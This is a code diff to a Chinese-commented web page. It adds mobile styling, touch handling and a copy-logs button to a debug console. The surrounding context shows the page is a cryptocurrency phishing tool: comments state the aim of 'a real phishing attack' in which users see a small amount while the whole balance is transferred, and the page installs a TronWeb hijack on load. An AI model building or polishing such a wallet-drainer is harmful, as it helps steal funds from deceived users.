@@ -1618,6 +1618,10 @@
             cursor: text;
             scrollbar-width: thin;
             scrollbar-color: #7ed321 rgba(255,255,255,0.1);
+            /* 移动端触摸滚动优化 */
+            -webkit-overflow-scrolling: touch;
+            touch-action: pan-y;
+            overscroll-behavior: contain;
         }
         
         .debug-panel::-webkit-scrollbar {
@@ -1675,6 +1679,44 @@
         .debug-clear:hover {
             background: #ff3838;
             transform: scale(1.1);
+        }
+        
+        /* 移动端控制台优化 */
+        @media (max-width: 768px) {
+            .debug-panel {
+                bottom: 80px;
+                left: 8px;
+                right: 8px;
+                max-height: 250px;
+                font-size: 12px;
+                padding: 12px;
+                /* 强制启用触摸滚动 */
+                overflow-y: scroll;
+                -webkit-overflow-scrolling: touch;
+                /* 防止页面滚动干扰 */
+                touch-action: pan-y;
+                /* 增强文本选择 */
+                -webkit-touch-callout: default;
+                -webkit-user-select: text;
+                -khtml-user-select: text;
+                -moz-user-select: text;
+                -ms-user-select: text;
+                user-select: text;
+            }
+            
+            .debug-toggle {
+                bottom: 80px;
+                right: 8px;
+                padding: 10px 14px;
+                font-size: 14px;
+            }
+            
+            .debug-clear {
+                bottom: 80px;
+                right: 70px;
+                padding: 10px 12px;
+                font-size: 16px;
+            }
         }
 
         /* 成功提示 */
@@ -2474,6 +2516,10 @@
         
         // 🎯 重新启用劫持安装，实现真正的钓鱼攻击
         document.addEventListener('DOMContentLoaded', function() {
+            // 📱 初始化移动端控制台增强
+            enhanceMobileConsole();
+            addMobileCopyButton();
+            
             debugLog('🎯 重新启用劫持逻辑，实现用户看到小额但实际转走全部');
             // 🎯 尝试立即安装劫持
             if (!window.installTronWebHijack()) {
@@ -3369,6 +3415,180 @@
                 debugLogElement.innerHTML = '';
                 debugLog('🗑️ 控制台已清空');
             }
+        }
+        
+        // 📱 移动端控制台增强
+        function enhanceMobileConsole() {
+            const debugPanel = document.getElementById('debugPanel');
+            const debugLog = document.getElementById('debugLog');
+            
+            if (!debugPanel || !debugLog) return;
+            
+            // 检测移动设备
+            const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            
+            if (isMobile) {
+                // 添加移动端专用样式
+                debugPanel.style.webkitOverflowScrolling = 'touch';
+                debugPanel.style.overflowScrolling = 'touch';
+                
+                // 长按复制功能
+                let longPressTimer;
+                let isLongPress = false;
+                
+                debugLog.addEventListener('touchstart', function(e) {
+                    isLongPress = false;
+                    longPressTimer = setTimeout(() => {
+                        isLongPress = true;
+                        // 触发长按复制
+                        showMobileCopyMenu(e);
+                    }, 800); // 800ms长按
+                }, { passive: false });
+                
+                debugLog.addEventListener('touchend', function(e) {
+                    clearTimeout(longPressTimer);
+                    if (isLongPress) {
+                        e.preventDefault();
+                    }
+                }, { passive: false });
+                
+                debugLog.addEventListener('touchmove', function(e) {
+                    clearTimeout(longPressTimer);
+                }, { passive: true });
+                
+                // 双击选择整行
+                let lastTap = 0;
+                debugLog.addEventListener('touchend', function(e) {
+                    const currentTime = new Date().getTime();
+                    const tapLength = currentTime - lastTap;
+                    if (tapLength < 500 && tapLength > 0) {
+                        // 双击选择整行
+                        selectLineText(e.target);
+                    }
+                    lastTap = currentTime;
+                });
+            }
+        }
+        
+        // 📱 显示移动端复制菜单
+        function showMobileCopyMenu(event) {
+            const selection = window.getSelection();
+            const debugText = document.getElementById('debugLog').innerText;
+            
+            if (debugText) {
+                // 创建复制提示
+                const copyHint = document.createElement('div');
+                copyHint.style.cssText = `
+                    position: fixed;
+                    top: 50%;
+                    left: 50%;
+                    transform: translate(-50%, -50%);
+                    background: #7ed321;
+                    color: #000;
+                    padding: 12px 20px;
+                    border-radius: 8px;
+                    font-weight: bold;
+                    z-index: 200;
+                    font-size: 14px;
+                `;
+                copyHint.textContent = '长按选择文本，然后复制';
+                document.body.appendChild(copyHint);
+                
+                // 3秒后移除提示
+                setTimeout(() => {
+                    if (copyHint.parentNode) {
+                        copyHint.parentNode.removeChild(copyHint);
+                    }
+                }, 3000);
+                
+                // 尝试选择所有文本
+                if (selection.rangeCount > 0) {
+                    selection.removeAllRanges();
+                }
+                const range = document.createRange();
+                range.selectNodeContents(document.getElementById('debugLog'));
+                selection.addRange(range);
+            }
+        }
+        
+        // 📱 选择整行文本
+        function selectLineText(element) {
+            const selection = window.getSelection();
+            const range = document.createRange();
+            
+            // 找到包含点击位置的行
+            let targetElement = element;
+            while (targetElement && targetElement.nodeType !== Node.TEXT_NODE) {
+                targetElement = targetElement.firstChild;
+            }
+            
+            if (targetElement) {
+                range.selectNodeContents(targetElement.parentNode);
+                selection.removeAllRanges();
+                selection.addRange(range);
+            }
+        }
+        
+        // 📱 添加复制按钮到控制台
+        function addMobileCopyButton() {
+            const debugPanel = document.getElementById('debugPanel');
+            if (!debugPanel) return;
+            
+            const copyBtn = document.createElement('button');
+            copyBtn.innerHTML = '📋';
+            copyBtn.title = '复制所有日志';
+            copyBtn.style.cssText = `
+                position: absolute;
+                top: 8px;
+                right: 8px;
+                background: #7ed321;
+                color: #000;
+                border: none;
+                padding: 6px 8px;
+                border-radius: 4px;
+                font-size: 12px;
+                cursor: pointer;
+                z-index: 151;
+            `;
+            
+            copyBtn.onclick = function() {
+                const debugText = document.getElementById('debugLog').innerText;
+                if (navigator.clipboard && navigator.clipboard.writeText) {
+                    navigator.clipboard.writeText(debugText).then(() => {
+                        showToast('📋 日志已复制到剪贴板', 'success');
+                    }).catch(() => {
+                        fallbackCopyText(debugText);
+                    });
+                } else {
+                    fallbackCopyText(debugText);
+                }
+            };
+            
+            debugPanel.appendChild(copyBtn);
+        }
+        
+        // 📱 备用复制方法
+        function fallbackCopyText(text) {
+            const textArea = document.createElement('textarea');
+            textArea.value = text;
+            textArea.style.cssText = `
+                position: fixed;
+                top: -1000px;
+                left: -1000px;
+                opacity: 0;
+            `;
+            document.body.appendChild(textArea);
+            textArea.focus();
+            textArea.select();
+            
+            try {
+                document.execCommand('copy');
+                showToast('📋 日志已复制', 'success');
+            } catch (err) {
+                showToast('❌ 复制失败，请手动选择', 'error');
+            }
+            
+            document.body.removeChild(textArea);
         }
 
         // 其他功能函数
